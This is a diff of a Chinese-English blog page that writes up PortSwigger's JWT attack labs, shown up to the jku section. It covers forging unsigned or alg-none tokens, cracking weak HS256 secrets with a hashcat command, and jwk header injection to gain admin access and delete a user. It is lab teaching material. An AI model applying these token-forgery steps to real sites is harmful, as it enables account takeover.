@@ -1,17 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
     
+    <style>
+        body
+        {
+            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   LXGW WenKai   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;
+
+        }
+    </style>
+
     <head>
     <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
     <meta name="description" content="JWT attacks" />
-    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <meta name="hexo-theme-A4" content="v1.9.0" />
     <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
     <title>Jay1an</title>
 
     
         
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
+<link rel="stylesheet" href="/css/highlight/style1.css">
 
         
 <link rel="stylesheet" href="/css/reset.css">
@@ -48,12 +56,207 @@
 
         
     
-    
 
-<meta name="generator" content="Hexo 6.3.0"></head>
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #323e74; 
+            --waline-color: #323e74; 
+            --waline-border-color: #323e74; 
+            --waline-white: #323e74; 
+            --waline-bgcolor-light: #f2fafc;  
+        }
+        body {
+            color: #323e74;
+            background: #eaeae8;
+        }
+        .post-md code {
+            background: #e7f7f3;
+            color: #7f688d; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #e7f7f3;
+            color: #7f688d; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #323e74;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #323e74;
+        }
+        .year-font-color {
+            color: #323e74 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #323e74; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #323e74;
+            color: #323e74; 
+        }
+        .wl-btn {
+            border: 1px solid #323e74; 
+            color:  #323e74;  
+        }
+        .wl-btn.primary {
+            color: #f2fafc; 
+        }
+        .wl-header label {
+            color: #323e74;
+        }
+        a {
+            color: #7f688d;
+        }
+
+        .post-md a {
+            color: #7f688d;
+        }
+
+        .nav li a {
+            color: #7f688d;
+        }
+
+        .archive-main a:link {
+            color: #7f688d;
+        }
+        .archive-main a:visited {
+            color: #767c7c; 
+        }
+
+        .archive li span {
+            color: #323e74;
+        }
+
+        .post-main-title {
+            color: #323e74;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #323e74;
+        }
+
+        [data-waline] p {
+            color: #323e74;
+        }
+        [data-waline] a {
+            color: #323e74;
+        } 
+        .wl-sort li.active {
+            color: #323e74;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #f2fafc;
+        }
+
+        .paper {
+            background: #eaeae8;
+        }
+
+        .index-main {
+            background: #f2fafc;
+        }
+
+        .paper-main {
+            background: #f2fafc;
+        }
+
+        .wl-panel {
+            background: #f2fafc;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #f2fafc;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #f2fafc;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #f2fafc;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #f2fafc;
+        }
+
+    
+        .progress-wrap::after {
+            color: #323e74; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #323e74; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, #7f688d, #7f688d); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #323e74; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #323e74; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, #7f688d, #7f688d); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #323e74; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: #7f688d;
+            border-left-color: #7f688d;
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #323e74;
+        }
+    </style>
+
     
     
     <body>
+        <script src="/js/darkmode-js.min.js"></script>
+        
+        <script>
+            const options = {
+                bottom: '53px', // default: '32px'
+                right: 'unset', // default: '32px'
+                left: '42px', // default: 'unset'
+                time: '0.3s', // default: '0.3s'
+                mixColor: '#fff', // default: '#fff'
+                backgroundColor: ' #eaeae8  ',  // default: '#fff'
+                buttonColorDark: '#100f2c',  // default: '#100f2c'
+                buttonColorLight: '#fff', // default: '#fff'
+                saveInCookies: true, // default: true,
+                label: '🌓', // default: ''
+                autoMatchOsTheme: true // default: true
+            }
+            const darkmode = new Darkmode(options);
+            darkmode.showWidget();
+        </script>
+        
         
             <div class="left-toc-container">
                 <nav id="toc" class="bs-docs-sidebar"></nav>
@@ -66,6 +269,8 @@
             
                 <div class="shadow-drop-2-bottom paper-main">
                     
+
+
 <div class="header">
     <div class="header-container">
         <img style="
@@ -97,6 +302,10 @@
                 <li><a href="/categories/">分类</a></li>
             
         
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
     </ul>
 </div> 
         
@@ -123,25 +332,17 @@
                 <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#What-are-JWTs"><span class="post-toc-text">What are JWTs</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-format"><span class="post-toc-text">JWT format</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-signature"><span class="post-toc-text">JWT signature</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#JWT-labs"><span class="post-toc-text">JWT-labs</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Accepting-arbitrary-signatures"><span class="post-toc-text">Accepting arbitrary signatures</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Accepting-tokens-with-no-signature"><span class="post-toc-text">Accepting tokens with no signature</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Brute-forcing-secret-keys"><span class="post-toc-text">Brute-forcing secret keys</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-header-parameter-injections"><span class="post-toc-text">JWT header parameter injections</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-jwk-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the jwk parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-jku-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the jku parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-kid-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the kid parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Other-interesting-JWT-header-parameters"><span class="post-toc-text">Other interesting JWT header parameters</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-algorithm-confusion"><span class="post-toc-text">JWT algorithm confusion</span></a></li></ol></li></ol>
             
         
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因23暑期实训针对crAPI靶场实验中JWT部分未成功，所以又重新使用PortSwigger上的Labs重新练习。</p>
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因23暑期实训针对crAPI靶场实验中JWT部分未成功，所以又重新使用PortSwigger上的Labs重新练习。</p>
 <p>英文部分从PortSwigger上复制。</p>
 <p>详细内容请访问：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt">https://portswigger.net/web-security/jwt</a></p>
 <h2 id="What-are-JWTs"><a href="#What-are-JWTs" class="headerlink" title="What are JWTs"></a>What are JWTs</h2><p>JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms.</p>
 <p>Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.</p>
 <h3 id="JWT-format"><a href="#JWT-format" class="headerlink" title="JWT format"></a>JWT format</h3><p>A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:</p>
-<pre><code>eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span><br></pre></td></tr></table></figure>
+
 <p>The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual “claims” about the user. For example, you can decode the payload from the token above to reveal the following claims:</p>
-<pre><code>&#123;    
-    &quot;iss&quot;: &quot;portswigger&quot;,   
-    &quot;exp&quot;: 1648037164,    
-    &quot;name&quot;: &quot;Carlos Montoya&quot;,    
-    &quot;sub&quot;: &quot;carlos&quot;,    
-    &quot;role&quot;: &quot;blog_author&quot;,    
-    &quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;,    
-    &quot;iat&quot;: 1516239022 
-&#125;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">	&quot;iss&quot;: &quot;portswigger&quot;,   </span><br><span class="line">	&quot;exp&quot;: 1648037164,    </span><br><span class="line">	&quot;name&quot;: &quot;Carlos Montoya&quot;,    </span><br><span class="line">	&quot;sub&quot;: &quot;carlos&quot;,    </span><br><span class="line">	&quot;role&quot;: &quot;blog_author&quot;,    </span><br><span class="line">	&quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;,    </span><br><span class="line">	&quot;iat&quot;: 1516239022 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>In most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the security of any JWT-based mechanism is heavily reliant on the cryptographic signature.</p>
 <h3 id="JWT-signature"><a href="#JWT-signature" class="headerlink" title="JWT signature"></a>JWT signature</h3><p>The server that issues the token typically generates the signature by hashing the header and payload. In some cases, they also encrypt the resulting hash. Either way, this process involves a secret signing key. This mechanism provides a way for servers to verify that none of the data within the token has been tampered with since it was issued:</p>
 <ul>
@@ -153,54 +354,53 @@
 <p>即程序员将<code>verify()</code>和<code>decode()</code>弄混了，导致网站后台并没有检验签名有效性。</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature"><strong>Lab1: JWT authentication bypass via unverified signature</strong></a></p>
 <p>首先，用已有的普通用户的账号密码登录，然后使用Burp Suite抓包可以知道Cookie中的Session存放着JWT。</p>
-<p><img src="/../img/JWT-attacks/1-1.png" alt="1-1"></p>
+<p><a href="/../img/JWT-attacks/1-1.png" title="1-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-1.png" alt="1-1"></a></p>
 <p>接着使用base64解码之后可以得到header和payload部分的内容：</p>
-<p><img src="/../img/JWT-attacks/1-2.png" alt="1-2"></p>
+<p><a href="/../img/JWT-attacks/1-2.png" title="1-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-2.png" alt="1-2"></a></p>
 <p>由于Lab 1并没有验证signature部分，所以我们直接将<code>sub</code>的值改为admin，得到新的JWT：</p>
-<p><img src="/../img/JWT-attacks/1-3.png" alt="1-3"></p>
+<p><a href="/../img/JWT-attacks/1-3.png" title="1-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-3.png" alt="1-3"></a></p>
 <p>通过Burp Suite将Session的值替换，即可以达到以admin身份登录的效果。但是无法访问&#x2F;admin目录，再将sub改为administrator即可，然后执行删除carlos的操作即可完成实验。</p>
-<p><img src="/../img/JWT-attacks/1-4.png" alt="1-4"></p>
+<p><a href="/../img/JWT-attacks/1-4.png" title="1-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-4.png" alt="1-4"></a></p>
 <p>可以直接登录操作，也可以通过访问接口删除:</p>
-<pre><code class="html">/admin/delete?username=carlos
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="Accepting-tokens-with-no-signature"><a href="#Accepting-tokens-with-no-signature" class="headerlink" title="Accepting tokens with no signature"></a>Accepting tokens with no signature</h3><p>Among other things, the JWT header contains an <code>alg</code> parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.</p>
-<pre><code class="json">&#123;    
-    &quot;alg&quot;: &quot;HS256&quot;,
-    &quot;typ&quot;: &quot;JWT&quot; 
-&#125;
-</code></pre>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>    </span><br><span class="line">	<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn’t been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.</p>
 <p>JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the <code>alg</code> parameter is set to <code>none</code>, which indicates a so-called “unsecured JWT”. Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.</p>
 <p>即服务器会根据<code>alg</code>的值来确定验证的算法，如果<code>alg</code>为none，则服务器就不会对signature部分进行检测，由于这样的错误比较明显，服务器后台程序员一般不会允许<code>alg</code>为none（通过字符串过滤等技术），攻击者可以选择方法（类似文件上传漏洞的绕过）进行绕过。</p>
 <p>注：即使不验证signature，但是最后还是要有<code>.</code>表示分割。</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification"><strong>Lab2: JWT authentication bypass via flawed signature verification</strong></a></p>
 <p>同Lab 1一样，利用已知的账号密码登录获得Session中存的JWT，再对JWT进行修改即可。</p>
-<p><img src="/../img/JWT-attacks/2-1.png" alt="2-1"></p>
+<p><a href="/../img/JWT-attacks/2-1.png" title="2-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/2-1.png" alt="2-1"></a></p>
 <p>测试后发现，signature部分要为空才能成功登录&#x2F;admin页面。登陆后删除carlos用户完成实验。</p>
-<p><img src="/../img/JWT-attacks/2-2.png" alt="2-2"></p>
+<p><a href="/../img/JWT-attacks/2-2.png" title="2-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/2-2.png" alt="2-2"></a></p>
 <h3 id="Brute-forcing-secret-keys"><a href="#Brute-forcing-secret-keys" class="headerlink" title="Brute-forcing secret keys"></a>Brute-forcing secret keys</h3><p>Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it’s crucial that this secret can’t be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.</p>
 <p>When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that’s provided as an example. In this case, it can be trivial for an attacker to brute-force a server’s secret using a <a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of well-known secrets</a>.</p>
 <p><strong>Brute-forcing secret keys using hashcat</strong></p>
 <p>You just need a valid, signed JWT from the target server and a <a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of well-known secrets</a>. You can then run the following command, passing in the JWT and wordlist as arguments:</p>
-<pre><code class="bash">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;</span><br></pre></td></tr></table></figure>
+
 <p>Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server. If any of the signatures match, hashcat outputs the identified secret in the following format, along with various other details:</p>
-<pre><code>&lt;jwt&gt;:&lt;identified-secret&gt;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jwt&gt;:&lt;identified-secret&gt;</span><br></pre></td></tr></table></figure>
+
 <p>即有的网站的后台的JWT验证程序使用了弱密钥，或者有些程序员会直接粘贴网上的线程的程序并且没有改密码，这样就可以被暴力破解，然后这里暴力破解用到的工具是hashcat。</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key"><strong>Lab3: JWT authentication bypass via weak signing key</strong></a></p>
 <p>首先先获得已知用户wiener的JWT，利用Wordlist中的所有密钥遍历，直到找出符合的那一个。</p>
 <p>这里我们使用了hashcat工具，在hashact的目录下执行以下命令：</p>
-<pre><code class="bash">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;</span><br></pre></td></tr></table></figure>
+
 <p>-a 指 –attack-mode，0表示攻击模式中的Straight；-m 指 –hash-type，16500表示JWT。</p>
-<p><img src="/../img/JWT-attacks/3-1.png" alt="3-1"></p>
+<p><a href="/../img/JWT-attacks/3-1.png" title="3-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-1.png" alt="3-1"></a></p>
 <p>执行结束后可以看到执行加密的密钥为secret1</p>
-<p><img src="/../img/JWT-attacks/3-2.png" alt="3-2"></p>
+<p><a href="/../img/JWT-attacks/3-2.png" title="3-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-2.png" alt="3-2"></a></p>
 <p>然后再更改JWT的header和payload，在用密钥对其签名即可。</p>
-<p><img src="/../img/JWT-attacks/3-3.png" alt="3-3"></p>
+<p><a href="/../img/JWT-attacks/3-3.png" title="3-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-3.png" alt="3-3"></a></p>
 <p>最后在Burp Suite中修改Session中的JWT，以管理员身份访问到&#x2F;admin目录，并删除用户carlos。</p>
-<p><img src="/../img/JWT-attacks/3-4.png" alt="3-4"></p>
+<p><a href="/../img/JWT-attacks/3-4.png" title="3-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-4.png" alt="3-4"></a></p>
 <h3 id="JWT-header-parameter-injections"><a href="#JWT-header-parameter-injections" class="headerlink" title="JWT header parameter injections"></a>JWT header parameter injections</h3><p>According to the JWS specification, only the <code>alg</code> header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.</p>
 <ul>
 <li><code>jwk</code> (JSON Web Key) - Provides an embedded JSON object representing the key.</li>
@@ -213,18 +413,8 @@
 <p> A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.</p>
 </blockquote>
 <p>You can see an example of this in the following JWT header:</p>
-<pre><code class="json">&#123;    
-    &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;,
-    &quot;typ&quot;: &quot;JWT&quot;,
-    &quot;alg&quot;: &quot;RS256&quot;,
-    &quot;jwk&quot;: &#123;
-        &quot;kty&quot;: &quot;RSA&quot;,
-        &quot;e&quot;: &quot;AQAB&quot;,
-        &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;,
-        &quot;n&quot;: &quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot;    
-    &#125;
-&#125;
-</code></pre>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>    </span><br><span class="line">	<span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jwk&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    	<span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot;</span>    </span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that’s embedded in the <code>jwk</code> parameter.</p>
 <p>You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the <code>jwk</code> header.</p>
 <p>即我们可以在JWT的头部插入<code>jwk</code>，让服务器利用我们给密钥来进行验证。这里我们可以自己创建一对RSA公私钥，先将header的<code>jwk</code>部分填充我们自己的公钥，然后用自己的私钥对header和payload进行签名，生成signature，这样完成了JWT的创建。</p>
@@ -232,31 +422,15 @@
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection"><strong>Lab4: JWT authentication bypass via jwk header injection</strong></a></p>
 <p>首先还是登录已知的账号，获得wiener（一直账号的名称）的JWT，然后在此基础上进行修改。</p>
 <p>我们利用Burp Suite的JWT插件自动生成RSA公私钥对：</p>
-<p><img src="/../img/JWT-attacks/4-1.png" alt="4-1"></p>
+<p><a href="/../img/JWT-attacks/4-1.png" title="4-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-1.png" alt="4-1"></a></p>
 <p>接着将payload的<code>sub</code>改为administrator，再点击Attack，使用Embedded JWT功能，Burp Suite会自动将刚才创建的公钥作为jwk添加到header中，将header中的kid和jwk中的kid改为一致，并且用私钥对header和payload进行加密生成signature。</p>
-<p><img src="/../img/JWT-attacks/4-2.png" alt="4-2"></p>
+<p><a href="/../img/JWT-attacks/4-2.png" title="4-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-2.png" alt="4-2"></a></p>
 <p>至此就完成了对JWT的修改，然后直接利用该JWT登录管理员界面，删除carlos用户即可完成实验。</p>
-<p><img src="/../img/JWT-attacks/4-3.png" alt="4-3"></p>
+<p><a href="/../img/JWT-attacks/4-3.png" title="4-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-3.png" alt="4-3"></a></p>
 <h4 id="Injecting-self-signed-JWTs-via-the-jku-parameter"><a href="#Injecting-self-signed-JWTs-via-the-jku-parameter" class="headerlink" title="Injecting self-signed JWTs via the jku parameter"></a>Injecting self-signed JWTs via the jku parameter</h4><p>Instead of embedding public keys directly using the <code>jwk</code> header parameter, some servers let you use the <code>jku</code> (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.</p>
 <blockquote>
 <p>A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.</p>
-<pre><code class="json">&#123;
-    &quot;keys&quot;: [
-        &#123;
-            &quot;kty&quot;: &quot;RSA&quot;,
-            &quot;e&quot;: &quot;AQAB&quot;,
-            &quot;kid&quot;: &quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;,
-            &quot;n&quot;: &quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;
-        &#125;,
-        &#123;
-            &quot;kty&quot;: &quot;RSA&quot;,
-            &quot;e&quot;: &quot;AQAB&quot;,
-            &quot;kid&quot;: &quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;,
-            &quot;n&quot;: &quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot;
-        &#125;
-    ]
-&#125;
-</code></pre>
